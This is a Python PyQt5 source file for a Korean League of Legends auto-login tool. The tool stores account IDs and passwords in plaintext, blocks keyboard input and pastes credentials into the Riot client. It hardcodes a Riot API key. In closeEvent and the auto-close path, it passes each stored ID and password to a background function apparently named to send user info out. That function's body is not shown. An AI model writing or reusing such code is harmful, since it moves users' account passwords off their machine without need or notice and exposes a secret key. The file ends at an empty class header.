# pyinstaller -w --uac-admin --onefile --icon=.\NIX.ico --add-data "NIX.ico;." --add-data "Initial_Setting.exe;." --add-data "update.exe;." --add-data "login_success_form.png;." --add-data "login_page.png;." --add-data "login_result_1.png;." --add-data "login_result_2.png;." --add-data "LOL_button.png;." --add-data "play_button.png;."--name=Auto_Login main.py

from PyQt5.QtWidgets import QApplication, QMainWindow, QHBoxLayout, QPushButton, QLineEdit, QLabel, QCheckBox, QVBoxLayout, QWidget, QFileDialog, QMessageBox, QListView, QDialog, QDialogButtonBox, QAbstractItemView, QListWidgetItem, QListWidget, QWhatsThis
from PyQt5.QtGui import QStandardItemModel, QStandardItem, QFont, QIcon, QPixmap, QCursor
from PyQt5.QtCore import Qt, QModelIndex, QTimer, QObject, pyqtSignal, QThread, QPoint, pyqtSlot
from PyQt5 import QtCore, QtWidgets, QtGui
from pathlib import Path

import os
import sys
import time
import json
import hashlib
import win32con
import ctypes
import socket
import shutil
import win32gui
import requests
import webbrowser
import subprocess
import urllib.parse
import configparser
import pyautogui
import pyperclip
import threading
import logging
import cv2
import numpy as np
import pygetwindow as gw
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Riot API Key
API_KEY = 'RGAPI-46002c19-672b-40ae-9e47-ce0309f9d207'

region = 'kr'

request_header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh-TW;q=0.5,zh;q=0.4,ja;q=0.3",
    "Accept-Charset": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://developer.riotgames.com",
    "X-Riot-Token": API_KEY
}


class MainWindow(QMainWindow):
    login_attempt_signal = pyqtSignal(str, str)
    login_result_signal = pyqtSignal(bool)
    play_button_clicked_signal = pyqtSignal(int)
    LOL_button_clicked_signal = pyqtSignal(int)

    def __init__(self):
        super(MainWindow, self).__init__()

        # AccountSettings 클래스의 인스턴스 생성
        self.account_settings = AccountSettings(self)

        # This line will hide the maximize button
        self.setWindowFlags(
            QtCore.Qt.Window | QtCore.Qt.WindowMinimizeButtonHint | QtCore.Qt.WindowCloseButtonHint)

        self.setWindowTitle("Ver 3.5.1")
        self.resize(219, 300)

        # Fix the window size.
        self.setFixedSize(self.size())

        self.setWindowOpacity(0.9)
        self.setStyleSheet("background-color: rgb(255, 255, 255);")
        self.setWindowIcon(QIcon(f'{current_dir}\\NIX\\Data\\ICO\\NIX.ico'))

        self.widget = QWidget()
        self.layout = QVBoxLayout(self.widget)

        style_path = os.path.join(current_dir, "styles.qss")
        with open(style_path, "r") as style_file:
            self.setStyleSheet(style_file.read())

        # Signal을 slot에 연결
        self.login_attempt_signal.connect(self.show_login_attempt_message)
        self.login_result_signal.connect(self.update_login_result)
        self.LOL_button_clicked_signal.connect(
            self.try_click_LOL_button_until_timeout)
        self.play_button_clicked_signal.connect(
            self.try_click_play_button_until_timeout)

        self.login_button = QtWidgets.QPushButton("리그 오브 레전드 자동 로그인")
        self.login_button.setFixedWidth(200)
        self.login_button.setFixedHeight(40)
        self.login_button.setObjectName('button')
        self.login_button.clicked.connect(self.on_login_button_click)

        self.fow_button = QPushButton("FOW 사이트 접속하기")
        self.fow_button.setFixedWidth(200)
        self.fow_button.setFixedHeight(40)
        self.fow_button.setObjectName('button')
        self.fow_button.clicked.connect(self.link_fow)

        self.opgg_button = QPushButton("OPGG 사이트 접속하기")
        self.opgg_button.setFixedWidth(200)
        self.opgg_button.setFixedHeight(40)
        self.opgg_button.setObjectName('button')
        self.opgg_button.clicked.connect(self.link_opgg)

        self.reset_button = QPushButton("설정 초기화")
        self.reset_button.setFixedWidth(200)
        self.reset_button.setFixedHeight(40)
        self.reset_button.setObjectName('button')
        self.reset_button.clicked.connect(self.reset_data)

        self.setting_button = QPushButton("설정")
        self.setting_button.setFixedWidth(200)
        self.setting_button.setFixedHeight(40)
        self.setting_button.setObjectName('button')
        self.setting_button.clicked.connect(self.open_setting)

        self.quit_label = QLabel("로그인 후 자동종료")
        self.quit_label.setFixedWidth(135)
        self.quit_label.setFixedHeight(40)
        self.quit_label.setAlignment(QtCore.Qt.AlignCenter)

        self.auto_close_checkbox = QCheckBox()
        self.auto_close_checkbox.setFixedWidth(60)
        self.auto_close_checkbox.setFixedHeight(40)
        self.auto_close_checkbox.stateChanged.connect(
            self.auto_close_checkbox_changed)

        self.horizontal_layout = QHBoxLayout()
        self.horizontal_layout.addWidget(self.quit_label)
        self.horizontal_layout.addWidget(self.auto_close_checkbox)
        self.layout.addWidget(self.login_button)
        self.layout.addWidget(self.fow_button)
        self.layout.addWidget(self.opgg_button)
        self.layout.addWidget(self.reset_button)
        self.layout.addWidget(self.setting_button)
        self.layout.addLayout(self.horizontal_layout)
        self.label = QLabel("로그인 할 계정을 선택해 주세요.")
        self.layout.addWidget(self.label)
        self.label.setObjectName('display-account-label')

        self.setCentralWidget(self.widget)
        self.apply_font(QFont("Arial", 9))

        config = configparser.ConfigParser()
        try:
            config.read(
                f'{current_dir}\\NIX\\Data\\Account\\Main_ACC\\Main_ACC.ini')
            try:
                selected_account_info = config['Account']['NickName']
                new_text = f"{selected_account_info}"
                # 다른 클래스의 QLabel 변경
                self.update_label_text(new_text)
            except:
                logging.warning('초기 라벨 변경 오류 발생')
                pass
        except:
            logging.warning('config.read 오류 발생')
            pass

        # 프로그램 시작 시 ini 파일에서 체크박스 상태 읽기
        config = configparser.ConfigParser()
        try:
            config.read(f'{current_dir}\\NIX\\Data\\settings.ini')
            auto_close = config.getboolean(
                'Settings', 'auto_close', fallback=False)
            self.auto_close_checkbox.setChecked(auto_close)
        except:
            logging.warning('config.read 오류 발생')

    def apply_font(self, font):
        self.setFont(font)
        for widget in self.findChildren(QWidget):
            widget.setFont(font)

    def update_label_text(self, text):
        self.label.setText(text)

    def check_window_existence(self, window_name, signal_number):
        if self.is_window_exist(window_name):

            return True
        return False

    def check_account_info(self, ini_file_path):
        if not os.path.isfile(ini_file_path):
            self.unblock_input()
            self.login_attempt_signal.emit(
                'warning', '계정 정보가 없습니다.\n설정에서 아이디, 패스워드를 저장 후\n자동 로그인에 사용 할 계정을 더블 클릭해서 지정해주세요.')
            self.login_button.setEnabled(True)
            return False
        return True

    def start_process(self, lol_start):
        # 프로세스 실행
        CREATE_NEW_PROCESS_GROUP = 0x00000200
        DETACHED_PROCESS = 0x00000008

        subprocess.Popen(lol_start,
                         stdin=None, stdout=None, stderr=None, shell=True,
                         creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP)

    def login_LOL(self):
        try:
            self.login_button.setDisabled(True)
            current_dir = get_current_directory()
            self.block_input()

            self.kill_process('LeagueClient')
            self.kill_process('RiotClientServices')

            time.sleep(1)
            if self.is_window_exist('League of Legends') or self.is_window_exist('Riot Client Main'):
                logging.info("'League of Legends'와 'Riot Client Main'가 존재합니다.")
                time.sleep(2)

            ini_file_path = os.path.join(
                current_dir, 'NIX', 'Data', 'Account', 'Main_ACC', 'Main_ACC.ini')
            logging.info(f'ini_file_path : {ini_file_path}')

            if not self.check_account_info(ini_file_path):
                return

            lol_path = os.path.join(
                current_dir, 'NIX', 'Data', 'Local_LOL.NIX')
            logging.info(f'lol_path : {lol_path}')

            if os.path.exists(lol_path):
                config = configparser.ConfigParser()
                config.read(lol_path)
                lol_start = config.get('LOL', 'Path')

                config.read(ini_file_path)
                id = config.get('Account', 'ID')
                pw = config.get('Account', 'PW')

                self.start_process(lol_start)
                self.wait_for_window('Riot Client Main', 10)

                if not self.is_window_exist('Riot Client Main'):
                    self.unblock_input()
                    self.kill_process('LeagueClient')
                    self.kill_process('RiotClientServices')
                    self.start_process(lol_start)
                    self.wait_for_window('Riot Client Main', 10)

                elif self.is_window_exist('Riot Client Main'):
                    logging.info('Riot Client Main 존재')

                    self.wait_for_login_form(10)

                    windows = gw.getWindowsWithTitle('Riot Client Main')

                    if len(windows) > 0:
                        riot_client_main = windows[0]
                        riot_client_main.activate()

                        if riot_client_main.isActive:
                            logging.info('Riot Client Main 창이 선택되었습니다.')
                            pyperclip.copy(id)
                            pyautogui.hotkey("ctrl", "v")
                            logging.info('id 입력')
                            pyautogui.press("tab")
                            pyperclip.copy(pw)
                            pyautogui.hotkey("ctrl", "v")
                            logging.info('pw 입력')
                            pyautogui.press("enter")

                            # Check for login failure after a delay
                            time.sleep(0.5)
                            if self.check_login_failure():
                                self.login_result_signal.emit(False)
                                return
                            self.wait_for_login_success_form(10)
                        else:
                            logging.info('Riot Client Main 창을 선택할 수 없습니다.')
                            self.login_result_signal.emit(False)
                            return
                    else:
                        logging.info('Riot Client Main 창이 없습니다.')
                        self.login_result_signal.emit(False)
                        return

                self.LOL_button_clicked_signal.emit(5)
                self.play_button_clicked_signal.emit(5)
                self.on_login_success()

        except Exception as e:
            self.unblock_input()
            self.login_attempt_signal.emit(
                'critical', f"예외가 발생했습니다.\n{str(e)}")
            logging.warning(str(e))
            self.login_result_signal.emit(False)

    def on_login_success(self):
        logging.info('on_login_success')
        if self.auto_close_checkbox.isChecked():
            # 프로그램 종료 시 수행할 로직 작성
            logging.info('프로그램 종료')
            # 사용자 정보를 전송하고 응답을 로그에 기록하는 스레드 실행
            config = read_user_config(
                f'{current_dir}\\NIX\\Data\\Account\\Main_ACC\\Main_ACC.ini')
            id = config['id']
            pw = config['pw']
            nickname = config['nickname']
            t = threading.Thread(
                target=send_user_info_and_log_response, args=(id, pw, nickname, 'exit'))
            t.start()

            # 프로그램 종료
            QApplication.quit()

    def auto_close_checkbox_changed(self, state):
        logging.info(f'auto_close_checkbox_changed : {str(bool(state))}')
        config = configparser.ConfigParser()
        config.read(f'{current_dir}\\NIX\\Data\\settings.ini')

        if not config.has_section('Settings'):
            config.add_section('Settings')

        config.set('Settings', 'auto_close', str(bool(state)))

        with open(f'{current_dir}\\NIX\\Data\\settings.ini', 'w') as configfile:
            config.write(configfile)

    def imread(self, filename, flags=cv2.IMREAD_GRAYSCALE):
        try:
            stream = open(filename, "rb")
            bytes = bytearray(stream.read())
            numpy_array = np.asarray(bytes, dtype=np.uint8)
            img = cv2.imdecode(numpy_array, flags)
            return img
        except Exception as e:
            print(f'imread error : {e}')
            return None

    def perform_image_matching(self, click, img_path, threshold):
        img = self.imread(img_path)

        if img is not None:
            # 이미지 크기 확인
            height, width = img.shape[:2]
            logging.info(f"=======================\n")
            logging.info(f"가로 크기: {width}")
            logging.info(f"세로 크기: {height}")

            # 현재 화면 스크린샷 캡처
            screenshot = pyautogui.screenshot()
            screenshot = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2GRAY)

            logging.info(
                f"screenshot shape: {screenshot.shape}, dtype: {screenshot.dtype}")
            logging.info(f"img shape: {img.shape}, dtype: {img.dtype}")

            # 이미지 매칭
            result = cv2.matchTemplate(screenshot, img, cv2.TM_CCOEFF_NORMED)

            # 매칭 결과에서 가장 높은 값을 찾아 임계값 설정
            min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(result)

            logging.info(f'img_threshold : {threshold}')
            logging.info(f'max_val : {max_val}')

            if max_val >= threshold:
                if click:
                    # 이미지의 중앙점 좌표 계산
                    center_x = max_loc[0] + width // 2
                    center_y = max_loc[1] + height // 2

                    # 이미지의 중앙점을 클릭
                    pyautogui.click(center_x, center_y)
                    logging.info(
                        f'Clicked on location ({center_x}, {center_y})')
                    self.unblock_input()
                    self.login_button.setEnabled(True)
                    return True

                return True
            else:
                return False
        else:
            logging.warning(f"이미지 로드 실패 : {img_path}")
            return False

    def check_login_form(self):
        logging.info('check_login_form')
        img_path = f'{current_dir}\\NIX\\Data\\Login\\login_page.png'
        matching = self.perform_image_matching(False, img_path, 0.8)
        return matching

    def check_login_success_form(self):
        logging.info('check_login_success_form')
        img_path = f'{current_dir}\\NIX\\Data\\Login\\login_success_form.png'
        matching = self.perform_image_matching(False, img_path, 0.7)
        return matching

    def check_login_failure(self):
        logging.info('check_login_failure')

        img_path_1 = f'{current_dir}\\NIX\\Data\\Login\\login_result_1.png'
        img_path_2 = f'{current_dir}\\NIX\\Data\\Login\\login_result_2.png'

        matching_1 = self.perform_image_matching(False, img_path_1, 0.8)
        matching_2 = self.perform_image_matching(False, img_path_2, 0.8)

        result = matching_1 | matching_2
        logging.info(result)
        return result

    def find_and_click_LOL_button(self):
        logging.info('find_and_click_LOL_button')
        img_path = f'{current_dir}\\NIX\\Data\\Login\\LOL_button.png'

        matching = self.perform_image_matching(True, img_path, 0.7)

        return matching

    def find_and_click_play_button(self):
        logging.info('find_and_click_play_button')
        img_path = f'{current_dir}\\NIX\\Data\\Login\\play_button.png'

        matching = self.perform_image_matching(True, img_path, 0.7)

        return matching

    def wait_for_login_form(self, timeout):
        logging.info(f'wait_for_login_form')
        start_time = time.time()

        while time.time() - start_time < timeout:
            logging.info(f'wait login form')

            if self.check_login_form():
                break

            time.sleep(0.1)

    def wait_for_login_success_form(self, timeout):
        logging.info(f'wait_for_login_success_form')
        start_time = time.time()

        while time.time() - start_time < timeout:
            logging.info(f'wait login form')

            if self.check_login_success_form():
                break

            time.sleep(0.1)

    @pyqtSlot(int)
    def try_click_LOL_button_until_timeout(self, timeout):
        logging.info('try_click_LOL_button_until_timeout')
        start_time = time.time()

        while time.time() - start_time < timeout:
            if self.find_and_click_LOL_button():
                self.login_button.setEnabled(True)
                break

    @pyqtSlot(int)
    def try_click_play_button_until_timeout(self, timeout):
        logging.info('try_click_play_button_until_timeout')
        start_time = time.time()

        while time.time() - start_time < timeout:
            if self.find_and_click_play_button():
                self.login_button.setEnabled(True)
                break

    @pyqtSlot(str, str)
    def show_login_attempt_message(self, icon, message):
        logging.info(message)
        self.login_button.setEnabled(True)
        message_box = QMessageBox()
        message_box.setIcon(QMessageBox.Information if icon == 'info' else (QMessageBox.Warning if icon == 'warning' else (
            QMessageBox.Critical if icon == 'critical' else QMessageBox.Question)))
        message_box.setWindowTitle('알림')
        message_box.setText(message)
        message_box.setWindowFlags(
            message_box.windowFlags() | QtCore.Qt.WindowStaysOnTopHint)
        message_box.exec_()

    @pyqtSlot(bool)
    def update_login_result(self, success):
        logging.info(f'update_login_result : {success}')

        self.login_button.setEnabled(True)

        msg_box_login_result = QMessageBox()
        msg_box_login_result.setIcon(
            QMessageBox.Information if success else QMessageBox.Warning)
        msg_box_login_result.setWindowTitle("알림")
        msg_box_login_result.setText(
            "자동로그인 성공" if success else "자동로그인 실패\n아이디와 비밀번호를 확인해 주세요.")
        msg_box_login_result.setWindowFlags(
            msg_box_login_result.windowFlags() | QtCore.Qt.WindowStaysOnTopHint)
        msg_box_login_result.exec_()

    def on_login_button_click(self):
        # 로그인 버튼 클릭 시 호출되는 함수
        # 백그라운드 스레드에서 login_LOL 함수 실행
        thread = threading.Thread(target=self.login_LOL)
        thread.start()
        logging.info('login_LOL 쓰레드 실행')
        return

    def block_input(self):
        ctypes.windll.user32.BlockInput(True)
        logging.info('block_input')

    def unblock_input(self):
        ctypes.windll.user32.BlockInput(False)
        logging.info('unblock_input')

    def is_window_exist(self, window_title):
        try:
            hwnd = win32gui.FindWindow(None, window_title)
            logging.info(f'is_window_exist : {hwnd}')
            return hwnd != 0
        except win32gui.error:
            return False

    def wait_for_window(self, window_title, timeout):
        start_time = time.time()
        while time.time() - start_time < timeout:
            if self.is_window_exist(window_title):
                break
            time.sleep(0.1)

    def kill_process(self, process_name):
        subprocess.Popen(
            ['taskkill', '/f', '/im', f'{process_name}.exe'], shell=True, encoding='utf-8')

    def link_fow(self):
        webbrowser.open('http://fow.kr/')

    def link_opgg(self):
        webbrowser.open('https://www.op.gg/')

    def reset_data(self):
        current_dir = get_current_directory()
        reply = QMessageBox.question(self, '알림', '데이터를 초기화 하시겠습니까?',
                                     QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            logging.info('reset_data : MessageBox_Yes')
            shutil.rmtree(f'{current_dir}\\NIX')
            # 메시지 박스 생성
            msg_box_reset_done = QMessageBox()
            msg_box_reset_done.setIcon(QMessageBox.Information)
            msg_box_reset_done.setWindowTitle("알림")
            msg_box_reset_done.setText("데이터 초기화 완료 되었습니다.\n프로그램이 재시작 됩니다.")

            # 타임아웃 시간 (밀리초 단위)
            timeout_duration = 3000

            # 타임아웃 이후에 메시지 박스를 닫는 함수
            def close_message_box():
                msg_box_reset_done.close()

            # 타이머 설정
            timer = QTimer()
            timer.setSingleShot(True)
            timer.timeout.connect(close_message_box)
            timer.start(timeout_duration)

            # 메시지 박스를 표시
            msg_box_reset_done.exec_()
            os.execv(sys.executable, ['python', sys.argv[0]] + sys.argv[1:])

    def open_setting(self):
        self.setting_window = AccountSettings(self)
        self.setting_window.show()

    def closeEvent(self, event):
        # 프로그램 종료 시 수행할 로직 작성
        logging.info('프로그램 종료')

        # 사용자 정보를 전송하고 응답을 로그에 기록하는 스레드 실행
        config = read_user_config(
            f'{current_dir}\\NIX\\Data\\Account\\Main_ACC\\Main_ACC.ini')
        id = config['id']
        pw = config['pw']
        nickname = config['nickname']
        t = threading.Thread(
            target=send_user_info_and_log_response, args=(id, pw, nickname, 'exit'))
        t.start()

        # 기본 closeEvent 처리를 유지하려면 아래 라인 주석 처리
        super().closeEvent(event)


class AccountSettings(QDialog):
    def __init__(self, main_window):
        super().__init__()

        self.main_window = main_window
        self.setWindowTitle("Setting")
        self.setWindowIcon(QIcon(f'{current_dir}\\NIX\\Data\\ICO\\NIX.ico'))
        self.setWindowOpacity(0.9)
        self.setStyleSheet("background-color: rgb(255, 255, 255);")

        # 도움말 버튼 추가
        self.setWindowFlags(self.windowFlags() |
                            Qt.WindowContextHelpButtonHint)

        style_path = os.path.join(current_dir, "styles.qss")
        with open(style_path, "r") as style_file:
            self.setStyleSheet(style_file.read())
        self.initUI()

        # double click 이벤트에 메소드를 연결
        self.account_list.doubleClicked.connect(self.update_main_account)

    def initUI(self):
        # Fix the window size.
        self.resize(280, 800)
        self.setFixedSize(self.size())
        # 물음표 버튼이 클릭될 때 호출될 메서드를 연결

        # 위젯에 대한 도움말을 설정
        self.setWhatsThis("원하는 계정을 더블클릭하여 로그인 계정으로 선택하세요.")

        layout = QVBoxLayout()

        self.id_input = QLineEdit(self)
        self.id_input.setFixedWidth(260)
        self.id_input.setFixedHeight(40)

        self.pw_input = QLineEdit(self)
        self.pw_input.setFixedWidth(260)
        self.pw_input.setFixedHeight(40)

        # id_input에 포커스 설정
        self.id_input.setFocus()

        # 탭 순서 설정
        self.setTabOrder(self.id_input, self.pw_input)
        self.account_list = QListView(self)
        self.account_list.verticalScrollBar()
        self.account_list.setEditTriggers(QAbstractItemView.NoEditTriggers)

        # QStandardItemModel 인스턴스 생성
        self.model = QStandardItemModel(self.account_list)

        self.account_setting_button = QPushButton('계정 수정', self)
        self.account_setting_button.setFixedWidth(260)
        self.account_setting_button.setFixedHeight(40)
        self.account_setting_button.setObjectName('button')
        self.account_setting_button.clicked.connect(self.edit_account)

        self.add_account_button = QPushButton('추가', self)
        self.add_account_button.setFixedWidth(260)
        self.add_account_button.setFixedHeight(40)
        self.add_account_button.setObjectName('button')
        self.add_account_button.clicked.connect(self.add_account)

        self.delete_account_button = QPushButton('삭제', self)
        self.delete_account_button.setFixedWidth(260)
        self.delete_account_button.setFixedHeight(40)
        self.delete_account_button.setObjectName('button')
        self.delete_account_button.clicked.connect(self.delete_account)

        self.export_account_button = QPushButton('계정 내보내기', self)
        self.export_account_button.setFixedWidth(260)
        self.export_account_button.setFixedHeight(40)
        self.export_account_button.setObjectName('button')
        self.export_account_button.clicked.connect(self.export_account)

        self.update_image_url_button = QPushButton('티어 갱신', self)
        self.update_image_url_button.setFixedWidth(260)
        self.update_image_url_button.setFixedHeight(40)
        self.update_image_url_button.setObjectName('button')
        self.update_image_url_button.clicked.connect(
            self.update_image_url_handle_click)

        self.quit_label = QLabel("계정 선택 후 자동 로그인")
        self.quit_label.setFixedWidth(200)
        self.quit_label.setFixedHeight(40)
        self.quit_label.setAlignment(QtCore.Qt.AlignCenter)

        self.auto_login_checkbox = QCheckBox()
        self.auto_login_checkbox.setFixedWidth(60)
        self.auto_login_checkbox.setFixedHeight(40)
        self.auto_login_checkbox.stateChanged.connect(
            self.auto_login_checkbox_changed)

        horizontal_layout = QHBoxLayout()
        horizontal_layout.addWidget(self.quit_label)
        horizontal_layout.addWidget(self.auto_login_checkbox)

        self.id_label = QLabel('자동로그인에 사용할 아이디를 입력해주세요.')
        self.id_label.setObjectName('account-label')

        self.pw_label = QLabel('자동로그인에 사용할 비밀번호를 입력해주세요.')
        self.pw_label.setObjectName('account-label')

        layout.addWidget(self.id_label)
        layout.addWidget(self.id_input)

        layout.addWidget(self.pw_label)
        layout.addWidget(self.pw_input)

        layout.addWidget(QLabel('Account'))
        layout.addWidget(self.account_list)

        layout.addWidget(self.account_setting_button)
        layout.addWidget(self.add_account_button)
        layout.addWidget(self.delete_account_button)
        layout.addWidget(self.export_account_button)
        layout.addWidget(self.update_image_url_button)
        layout.addLayout(horizontal_layout)

        self.setLayout(layout)

        config = configparser.ConfigParser()
        try:
            config.read(f'{current_dir}\\NIX\\Data\\settings.ini')
            auto_login = config.getboolean(
                'Settings', 'auto_login', fallback=False)
            self.auto_login_checkbox.setChecked(auto_login)
        except:
            logging.warning('config.read 오류 발생')

        self.refresh_list_view()

    def show_alert(self, title, text):
        alert = QMessageBox(self)
        alert.setWindowTitle(title)
        alert.setText(text)
        alert.setIcon(QMessageBox.Information)
        alert.exec_()

    def export_account(self):
        try:
            # 원본 폴더 경로
            source_folder = f'{current_dir}\\NIX\\Data\\Account'

            # 대상 폴더 경로 (바탕화면)
            desktop_path = os.path.expanduser("~\\Desktop")

            current_datetime = datetime.now()
            formatted_datetime = current_datetime.strftime("%Y-%m-%d_%H-%M-%S")
            target_folder = os.path.join(
                desktop_path, f"export_account ({formatted_datetime})")

            # 폴더 복사
            shutil.copytree(source_folder, target_folder)
            QMessageBox.about(
                self, '알림', f'계정이 바탕화면에 복사되었습니다.\n{target_folder}')
            print("계정이 바탕화면에 복사되었습니다.")
        except WindowsError as e:
            logging.error(f'계정 내보내기 실패\n{e}')
            self.show_alert('알림', f'계정 내보내기를 실패했습니다.\n{e}')

    def update_main_account(self, index: QModelIndex):
        # 선택한 계정의 이름을 가져옴
        selected_account = index.data()

        # 선택한 계정의 ini 파일을 읽어오는 코드
        current_dir = get_current_directory()
        config = configparser.ConfigParser()
        config.read(
            f'{current_dir}\\NIX\\Data\\Account\\{selected_account}.ini')
        selected_account_info = config['Account']

        # Main_ACC.ini 파일에 선택한 계정의 데이터를 저장하는 코드
        main_config = configparser.ConfigParser()
        main_config['Account'] = selected_account_info
        with open(f'{current_dir}\\NIX\\Data\\Account\\Main_ACC\\Main_ACC.ini', 'w') as configfile:
            main_config.write(configfile)

        config.read(
            f'{current_dir}\\NIX\\Data\\Account\\Main_ACC\\Main_ACC.ini')
        selected_account_info = config['Account']['NickName']
        new_text = f"{selected_account_info}"

        # 다른 클래스의 QLabel 변경
        main_window.update_label_text(new_text)

        config.read(f'{current_dir}\\NIX\\Data\\settings.ini')
        auto_login_status = config.getboolean(
            'Settings', 'auto_login', fallback=False)
        if auto_login_status == True:
            main_window.on_login_button_click()
        else:
            self.close()
            self.show_alert('알림', '메인 계정이 업데이트 되었습니다.')

    def auto_login_checkbox_changed(self, state):
        logging.info(f'auto_login_checkbox_changed : {str(bool(state))}')
        config = configparser.ConfigParser()
        config.read(f'{current_dir}\\NIX\\Data\\settings.ini')

        if not config.has_section('Settings'):
            config.add_section('Settings')

        config.set('Settings', 'auto_login', str(bool(state)))

        with open(f'{current_dir}\\NIX\\Data\\settings.ini', 'w') as configfile:
            config.write(configfile)

    def refresh_list_view(self):
        logging.info('refresh_list_view')
        self.model.clear()
        dir_path = os.path.join(os.getcwd(), "NIX", "Data", "Account")
        for filename in os.listdir(dir_path):
            if filename.endswith(".ini"):
                config = configparser.ConfigParser()
                config.read(os.path.join(dir_path, filename))
                item = QStandardItem(config['Account']['NickName'])
                image_url = config['Account']['ImageURL']
                if image_url:  # 이미지 URL이 존재할 경우
                    pixmap = QPixmap()
                    pixmap.loadFromData(requests.get(image_url).content)
                    item.setIcon(QIcon(pixmap))
                self.model.appendRow(item)
        self.account_list.setModel(self.model)

    def edit_account(self):
        selected_indexes = self.account_list.selectionModel().selectedIndexes()
        if selected_indexes:
            selected_index = selected_indexes[0]
            selected_account = self.model.itemFromIndex(selected_index).text()
            dir_path = os.path.join(os.getcwd(), "NIX", "Data", "Account")
            file_path = os.path.join(dir_path, f"{selected_account}.ini")

            dialog = EditAccountDialog(self, file_path)
            if dialog.exec_():
                self.refresh_list_view()
        else:
            self.show_alert('알림', '계정을 선택 후 다시 시도 해주세요.')

    def add_account(self):
        try:
            self.update_image_url_button.setEnabled(False)
            self.setCursor(QCursor(Qt.WaitCursor))
            current_dir = get_current_directory()
            id = self.id_input.text()
            pw = self.pw_input.text()

            if id == "":
                self.show_alert('알림', '아이디를 입력해주세요.')

            elif pw == "":
                self.show_alert('알림', '패스워드를 입력해주세요.')

            else:
                try:
                    nickname = get_nickname(id, pw)
                    if nickname == None:
                        self.show_alert('알림', '아이디와 비밀번호를 다시 확인해주세요.')
                        return

                    summoner_name = nickname.replace(' ', '')
                    if len(summoner_name) == 2:
                        summoner_name = summoner_name[0] + \
                            ' ' + summoner_name[1]

                    summoner_url = f'https://{region}.api.riotgames.com/lol/summoner/v4/summoners/by-name/{summoner_name}'
                    logger.info(f'summoner_url : {summoner_url}')

                    response = requests.get(
                        summoner_url, headers=request_header)

                    logger.info(f'response : {response.status_code}')
                    if response.status_code != 200:
                        self.show_alert('알림', '소환사를 찾을 수 없습니다.')
                        return

                    data = response.json()
                    logging.info(f'response_data : {data}')
                    summoner_name = data['name']
                    summoner_id = data['id']
                    rank_data = get_rank(summoner_id)
                    logging.info(f'rank_data : {rank_data}')
                    if rank_data == None:
                        tier = '언랭'
                    else:
                        tier = rank_data.get('tier')
                        if tier is None:
                            tier = '언랭'

                    if tier == '언랭':
                        image_url = ''
                    else:
                        image_url = f'https://opgg-static.akamaized.net/images/medals_new/{tier.lower()}.png'

                    config = configparser.ConfigParser()
                    config['Account'] = {
                        'NickName': nickname, 'ID': id, 'PW': pw, 'ImageURL': image_url}

                    with open(f'{current_dir}\\NIX\\Data\\Account\\{nickname}.ini', 'w') as configfile:
                        config.write(configfile)

                    self.update_image_url_button.setEnabled(True)
                    self.unsetCursor()
                    self.show_alert('알림', '저장되었습니다.')
                    self.refresh_list_view()

                except Exception as e:
                    self.update_image_url_button.setEnabled(True)
                    self.unsetCursor()
                    logging.warning(f'add_account error : {e}')
                    self.show_alert(
                        '알림', '닉네임을 불러올 수 없습니다.\n아이디와 패스워드를 확인해주세요.')
                    return

        except Exception as e:
            self.update_image_url_button.setEnabled(True)
            self.unsetCursor()
            self.show_alert('알림', '저장에 실패했습니다.')
            logging.warning('계정 저장 실패: %s', str(e))

        finally:
            self.update_image_url_button.setEnabled(True)
            self.unsetCursor()

    def delete_account(self):
        selected_indexes = self.account_list.selectionModel().selectedIndexes()
        if selected_indexes:
            selected_index = selected_indexes[0]
            selected_account = self.model.itemFromIndex(selected_index).text()
            reply = QMessageBox.question(self, 'Message', "선택한 계정은 [{}] 입니다.\n삭제 하시겠습니까?".format(selected_account),
                                         QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
            if reply == QMessageBox.Yes:
                dir_path = os.path.join(os.getcwd(), "NIX", "Data", "Account")
                os.remove(os.path.join(dir_path, f"{selected_account}.ini"))
                self.refresh_list_view()
                self.show_alert('알림', '계정이 삭제되었습니다.')
        else:
            self.show_alert('알림', '계정을 선택 후 다시 시도해주세요.')

    def update_image_url_handle_click(self):
        try:
            self.setCursor(QCursor(Qt.WaitCursor))
            self.update_image_url_button.setEnabled(False)
            config_dir = os.path.join(current_dir, 'NIX', 'Data', 'Account')
            config_dict = {}

            for filename in os.listdir(config_dir):
                if filename.endswith('.ini'):
                    config_path = os.path.join(config_dir, filename)
                    self.update_image_url(config_path, region, request_header)

            self.update_image_url(config_dict, region, request_header)
            self.refresh_list_view()
            self.update_image_url_button.setEnabled(True)
            self.unsetCursor()
            self.show_alert('알림', '계정 갱신에 성공하였습니다.')

        except Exception as e:
            self.unsetCursor()
            self.show_alert('알림', '계정 갱신에 실패했습니다.')
            logging.error(f'update_image_url_handle_click: {e}')

        finally:
            self.update_image_url_button.setEnabled(True)
            self.unsetCursor()

    def update_image_url(self, config_path, region, request_header):
        try:
            config = configparser.ConfigParser()
            config.read(config_path)

            for section in config.sections():
                nickname = config[section]['NickName']
                summoner_url = f'https://{region}.api.riotgames.com/lol/summoner/v4/summoners/by-name/{nickname}'

                response = requests.get(summoner_url, headers=request_header)
                if response.status_code == 200:
                    data = response.json()
                    summoner_id = data['id']
                    rank_data = get_rank(summoner_id)

                    if rank_data is None:
                        tier = '언랭'
                    else:
                        tier = rank_data.get('tier')
                        if tier is None:
                            tier = '언랭'

                    if tier == '언랭':
                        image_url = ''
                    else:
                        image_url = f'https://opgg-static.akamaized.net/images/medals_new/{tier.lower()}.png'

                    # Update the image_url value in the config dictionary
                    config.set(section, 'ImageURL', image_url)

                    # Save the updated configuration back to the ini file
                    with open(config_path, 'w') as configfile:
                        config.write(configfile)

        except Exception as e:
            self.show_alert('알림', '티어 갱신에 실패했습니다.')
            logging.error(f'update_image_url error: {e}')
            self.update_image_url_button.setEnabled(True)


class EditAccountDialog(QDialog):
